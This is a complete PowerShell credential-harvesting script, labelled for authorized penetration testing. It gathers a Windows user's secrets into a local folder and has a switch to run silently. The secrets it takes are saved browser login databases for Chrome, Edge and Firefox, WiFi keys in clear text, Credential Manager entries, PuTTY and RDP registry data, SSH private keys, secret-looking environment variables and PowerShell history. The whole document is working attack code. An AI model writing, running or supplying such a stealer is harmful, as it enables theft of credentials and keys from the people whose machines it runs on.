# Windows Credential Harvester - Native PowerShell
# No Python Required - For authorized penetration testing only

param(
    [string]$OutputDir = ".\harvested_credentials",
    [switch]$Silent
)

function Write-Log {
    param([string]$Message)
    if (-not $Silent) {
        Write-Host "[*] $Message"
    }
}

# Create output directory
New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$outputFile = Join-Path $OutputDir "credentials_$timestamp.txt"

Write-Log "Windows Credential Harvester"
Write-Log "Output: $outputFile"
Write-Log "="*50

# Function to harvest browser credentials
function Get-BrowserPasswords {
    Write-Log "Harvesting browser credentials..."
    
    # Chrome Login Data
    $chromePaths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Login Data"
    )
    
    foreach ($path in $chromePaths) {
        if (Test-Path $path) {
            $dest = Join-Path $OutputDir "chrome_login_data_$(Split-Path $path -Leaf).db"
            try {
                Copy-Item $path -Destination $dest -Force -ErrorAction SilentlyContinue
                Add-Content $outputFile "`n[+] Chrome Login Data copied: $dest"
                Write-Log "Chrome credentials database copied"
            } catch {}
        }
    }
    
    # Edge Login Data
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
    if (Test-Path $edgePath) {
        $dest = Join-Path $OutputDir "edge_login_data.db"
        try {
            Copy-Item $edgePath -Destination $dest -Force -ErrorAction SilentlyContinue
            Add-Content $outputFile "`n[+] Edge Login Data copied: $dest"
            Write-Log "Edge credentials database copied"
        } catch {}
    }
    
    # Firefox logins.json
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxPath) {
        Get-ChildItem -Path $firefoxPath -Filter "logins.json" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            $dest = Join-Path $OutputDir "firefox_logins_$($_.Directory.Name).json"
            Copy-Item $_.FullName -Destination $dest -Force
            Add-Content $outputFile "`n[+] Firefox logins copied: $dest"
            Write-Log "Firefox credentials copied"
        }
    }
}

# Function to harvest WiFi passwords
function Get-WiFiPasswords {
    Write-Log "Harvesting WiFi passwords..."
    Add-Content $outputFile "`n`n=== WiFi Passwords ===`n"
    
    $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
        ($_ -split ":")[-1].Trim()
    }
    
    foreach ($profile in $profiles) {
        $password = (netsh wlan show profile name=$profile key=clear) | Select-String "Key Content"
        if ($password) {
            $pass = ($password -split ":")[-1].Trim()
            $result = "SSID: $profile | Password: $pass"
            Add-Content $outputFile $result
            Write-Log "Found WiFi: $profile"
        }
    }
}

# Function to harvest Windows Credential Manager
function Get-SavedCredentials {
    Write-Log "Harvesting Windows Credential Manager..."
    Add-Content $outputFile "`n`n=== Saved Credentials ===`n"
    
    $creds = cmdkey /list
    Add-Content $outputFile $creds
}

# Function to harvest registry stored credentials
function Get-RegistryCredentials {
    Write-Log "Checking registry for stored credentials..."
    Add-Content $outputFile "`n`n=== Registry Credentials ===`n"
    
    # Common registry locations
    $regPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings",
        "HKCU:\Software\SimonTatham\PuTTY\Sessions"
    )
    
    foreach ($path in $regPaths) {
        if (Test-Path $path) {
            try {
                $values = Get-ItemProperty -Path $path -ErrorAction SilentlyContinue
                Add-Content $outputFile "`nRegistry Path: $path"
                Add-Content $outputFile ($values | Out-String)
            } catch {}
        }
    }
}

# Function to harvest SSH keys
function Get-SSHKeys {
    Write-Log "Harvesting SSH keys..."
    Add-Content $outputFile "`n`n=== SSH Keys ===`n"
    
    $sshPath = "$env:USERPROFILE\.ssh"
    if (Test-Path $sshPath) {
        Get-ChildItem -Path $sshPath -File | ForEach-Object {
            $dest = Join-Path $OutputDir "ssh_$($_.Name)"
            Copy-Item $_.FullName -Destination $dest -Force
            Add-Content $outputFile "[+] SSH key copied: $($_.Name)"
            Write-Log "SSH key found: $($_.Name)"
        }
    }
}

# Function to harvest RDP credentials
function Get-RDPCredentials {
    Write-Log "Harvesting RDP credentials..."
    Add-Content $outputFile "`n`n=== RDP Saved Connections ===`n"
    
    $rdpPath = "HKCU:\Software\Microsoft\Terminal Server Client\Servers"
    if (Test-Path $rdpPath) {
        Get-ChildItem -Path $rdpPath | ForEach-Object {
            Add-Content $outputFile "RDP Server: $($_.PSChildName)"
        }
    }
}

# Function to harvest environment variables (may contain secrets)
function Get-EnvironmentSecrets {
    Write-Log "Checking environment variables..."
    Add-Content $outputFile "`n`n=== Environment Variables ===`n"
    
    Get-ChildItem Env: | Where-Object { 
        $_.Name -match "key|token|password|secret|api" 
    } | ForEach-Object {
        Add-Content $outputFile "$($_.Name) = $($_.Value)"
    }
}

# Function to harvest PowerShell history
function Get-PowerShellHistory {
    Write-Log "Harvesting PowerShell command history..."
    Add-Content $outputFile "`n`n=== PowerShell History ===`n"
    
    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $historyPath) {
        $dest = Join-Path $OutputDir "powershell_history.txt"
        Copy-Item $historyPath -Destination $dest -Force
        Add-Content $outputFile "[+] PowerShell history copied: $dest"
        Write-Log "PowerShell history copied"
    }
}

# Function to harvest recent files
function Get-RecentFiles {
    Write-Log "Harvesting recent files list..."
    Add-Content $outputFile "`n`n=== Recent Files ===`n"
    
    $recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
    if (Test-Path $recentPath) {
        Get-ChildItem -Path $recentPath -File | Select-Object -First 50 | ForEach-Object {
            Add-Content $outputFile $_.Name
        }
    }
}

# Main execution
try {
    Add-Content $outputFile "Windows Credential Harvester Report"
    Add-Content $outputFile "Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Add-Content $outputFile "Computer: $env:COMPUTERNAME"
    Add-Content $outputFile "User: $env:USERNAME"
    Add-Content $outputFile "="*50
    
    Get-BrowserPasswords
    Get-WiFiPasswords
    Get-SavedCredentials
    Get-RegistryCredentials
    Get-SSHKeys
    Get-RDPCredentials
    Get-EnvironmentSecrets
    Get-PowerShellHistory
    Get-RecentFiles
    
    Write-Log "`nHarvesting complete!"
    Write-Log "Results saved to: $outputFile"
    Write-Log "Additional files saved to: $OutputDir"
    
    # Display summary
    if (-not $Silent) {
        Write-Host "`n[+] Summary:" -ForegroundColor Green
        Get-Content $outputFile | Select-String "^\[.*\]" | ForEach-Object { Write-Host $_ }
    }
    
} catch {
    Write-Host "[!] Error: $_" -ForegroundColor Red
}
